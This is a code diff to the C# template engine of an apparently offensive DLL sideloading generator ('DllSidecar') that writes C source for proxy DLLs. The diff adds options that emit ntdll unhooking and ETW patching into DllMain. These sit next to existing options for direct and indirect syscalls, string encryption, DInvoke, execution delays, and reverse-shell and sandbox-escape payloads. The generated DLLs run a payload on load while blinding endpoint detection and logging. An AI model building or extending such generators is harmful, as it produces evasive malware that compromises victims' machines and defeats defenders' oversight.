@@ -40,6 +40,12 @@ public static class TemplateEngine
         sb.AppendLine("#include <stdio.h>");
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
+        if (config.UnhookNtdll) sb.AppendLine("#include \"unhook.h\"");
+        if (config.PatchEtw)
+        {
+            sb.AppendLine($"#define H_ETWEVENTWRITE 0x{Djb2.Hash("EtwEventWrite"):X8}UL");
+            sb.AppendLine("#include \"etw.h\"");
+        }
         sb.AppendLine();
 
         // Header
@@ -90,6 +96,8 @@ public static class TemplateEngine
         sb.AppendLine("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {");
         sb.AppendLine("    if (fdwReason == DLL_PROCESS_ATTACH) {");
         sb.AppendLine("        DisableThreadLibraryCalls(hinstDLL);");
+        if (config.UnhookNtdll) sb.AppendLine("        unhook_ntdll();");
+        if (config.PatchEtw) sb.AppendLine("        patch_etw();");
         sb.Append(GenerateLoadOriginal(config, renamed, exports));
         sb.AppendLine("        g_hLogFile = CreateFileA(\"sidecar_trace.log\", GENERIC_WRITE,");
         sb.AppendLine("            FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);");
@@ -183,6 +191,12 @@ public static class TemplateEngine
         if (config.IndirectSyscalls) sb.AppendLine("#include \"syscalls_indirect.h\"");
         else if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
+        if (config.UnhookNtdll) sb.AppendLine("#include \"unhook.h\"");
+        if (config.PatchEtw)
+        {
+            sb.AppendLine($"#define H_ETWEVENTWRITE 0x{Djb2.Hash("EtwEventWrite"):X8}UL");
+            sb.AppendLine("#include \"etw.h\"");
+        }
         if (config.Payload == PayloadType.ReverseShell && !config.DInvoke)
             EmitReverseShellTypedefs(sb);
         sb.AppendLine();
@@ -243,6 +257,8 @@ public static class TemplateEngine
         sb.AppendLine("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {");
         sb.AppendLine("    if (fdwReason == DLL_PROCESS_ATTACH) {");
         sb.AppendLine("        DisableThreadLibraryCalls(hinstDLL);");
+        if (config.UnhookNtdll) sb.AppendLine("        unhook_ntdll();");
+        if (config.PatchEtw) sb.AppendLine("        patch_etw();");
         if (config.DelayMs > 0)
             sb.AppendLine(config.DInvoke ? $"        sc_delay({config.DelayMs});" : $"        Sleep({config.DelayMs});");
         if (config.AnySyscalls)
@@ -290,21 +306,16 @@ public static class TemplateEngine
         sb.AppendLine("#include <windows.h>");
         sb.AppendLine("#include <stdio.h>");
         if (config.Payload == PayloadType.SandboxEscape) sb.AppendLine("#include <tlhelp32.h>");
-        if (config.Payload == PayloadType.ReverseShell)
-        {
-            // winsock2.h MUST precede windows.h in many SDKs, but MinGW's <windows.h>
-            // already excludes the old winsock1 bits when WIN32_LEAN_AND_MEAN is set
-            // OR when winsock2.h is the first/only socket header pulled. Including
-            // it after <windows.h> here works on MinGW because the canonical guard
-            // (_WINSOCKAPI_) hasn't been triggered yet — neither <windows.h> nor
-            // <stdio.h> pull winsock1 by default on MinGW.
-            sb.AppendLine("#include <winsock2.h>");
-            sb.AppendLine("#include <ws2tcpip.h>");
-        }
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.IndirectSyscalls) sb.AppendLine("#include \"syscalls_indirect.h\"");
         else if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
+        if (config.UnhookNtdll) sb.AppendLine("#include \"unhook.h\"");
+        if (config.PatchEtw)
+        {
+            sb.AppendLine($"#define H_ETWEVENTWRITE 0x{Djb2.Hash("EtwEventWrite"):X8}UL");
+            sb.AppendLine("#include \"etw.h\"");
+        }
         // Non-DInvoke ReverseShell paths resolve via LoadLibraryA + GetProcAddress
         // and need the WS2_32 / CreateProcessA function-pointer types declared
         // locally — dinvoke.h's gated copies are not visible without DInvoke.
@@ -338,6 +349,8 @@ public static class TemplateEngine
         sb.AppendLine("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {");
         sb.AppendLine("    if (fdwReason == DLL_PROCESS_ATTACH) {");
         sb.AppendLine("        DisableThreadLibraryCalls(hinstDLL);");
+        if (config.UnhookNtdll) sb.AppendLine("        unhook_ntdll();");
+        if (config.PatchEtw) sb.AppendLine("        patch_etw();");
         if (config.DelayMs > 0)
             sb.AppendLine(config.DInvoke ? $"        sc_delay({config.DelayMs});" : $"        Sleep({config.DelayMs});");
         if (config.AnySyscalls)
@@ -443,6 +456,12 @@ public static class TemplateEngine
         if (config.IndirectSyscalls) sb.AppendLine("#include \"syscalls_indirect.h\"");
         else if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
+        if (config.UnhookNtdll) sb.AppendLine("#include \"unhook.h\"");
+        if (config.PatchEtw)
+        {
+            sb.AppendLine($"#define H_ETWEVENTWRITE 0x{Djb2.Hash("EtwEventWrite"):X8}UL");
+            sb.AppendLine("#include \"etw.h\"");
+        }
         if (config.Payload == PayloadType.ReverseShell && !config.DInvoke)
             EmitReverseShellTypedefs(sb);
         sb.AppendLine();
@@ -474,6 +493,8 @@ public static class TemplateEngine
         sb.AppendLine("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {");
         sb.AppendLine("    if (fdwReason == DLL_PROCESS_ATTACH) {");
         sb.AppendLine("        DisableThreadLibraryCalls(hinstDLL);");
+        if (config.UnhookNtdll) sb.AppendLine("        unhook_ntdll();");
+        if (config.PatchEtw) sb.AppendLine("        patch_etw();");
         if (config.DelayMs > 0)
             sb.AppendLine(config.DInvoke ? $"        sc_delay({config.DelayMs});" : $"        Sleep({config.DelayMs});");
         if (config.AnySyscalls)
@@ -1164,31 +1185,29 @@ public static class TemplateEngine
         return sb.ToString();
     }
 
+    // Emits the dispatch statement inside payload_execute(). The caller wraps
+    // this block with the file-scope g_payload_fired once-guard, so this body
+    // can fire unconditionally — no inner InterlockedCompareExchange needed.
     private static string GeneratePayloadInvoke(TemplateConfig config)
     {
         var sb = new StringBuilder();
-        sb.AppendLine("    static volatile LONG payload_fired = 0;");
-        sb.AppendLine("    if (InterlockedCompareExchange(&payload_fired, 1, 0) == 0)");
-
         switch (config.Thread)
         {
             case ThreadMode.Calling:
-                sb.AppendLine("        do_payload();");
+                sb.AppendLine("    do_payload();");
                 break;
             case ThreadMode.Std:
-                sb.AppendLine("        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)do_payload, NULL, 0, NULL);");
+                sb.AppendLine("    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)do_payload, NULL, 0, NULL);");
                 break;
             case ThreadMode.Native:
                 if (config.AnySyscalls)
                 {
-                    sb.AppendLine("    {");
-                    sb.AppendLine("        HANDLE hThread = NULL;");
-                    sb.AppendLine("        sc_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,");
-                    sb.AppendLine("            (HANDLE)-1, (PVOID)do_payload, NULL, 0, 0, 0, 0, NULL);");
-                    sb.AppendLine("    }");
+                    sb.AppendLine("    HANDLE hThread = NULL;");
+                    sb.AppendLine("    sc_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,");
+                    sb.AppendLine("        (HANDLE)-1, (PVOID)do_payload, NULL, 0, 0, 0, 0, NULL);");
                 }
                 else
-                    sb.AppendLine("        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)do_payload, NULL, 0, NULL);");
+                    sb.AppendLine("    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)do_payload, NULL, 0, NULL);");
                 break;
         }
         return sb.ToString();
@@ -1222,7 +1241,7 @@ public static class TemplateEngine
         // `-I.` works in both dev and installed layouts — the previous
         // `-I../../templates` resolved to `C:\templates` in installed mode
         // (4-up from `C:\Program Files\DllSidecar\output\...` saturated at C:\).
-        var needsHeaders = config.DInvoke || config.EncryptStrings || config.AnySyscalls;
+        var needsHeaders = config.DInvoke || config.EncryptStrings || config.AnySyscalls || config.UnhookNtdll || config.PatchEtw;
         var incFlag = needsHeaders ? "-I." : "";
 
         var sb = new StringBuilder();
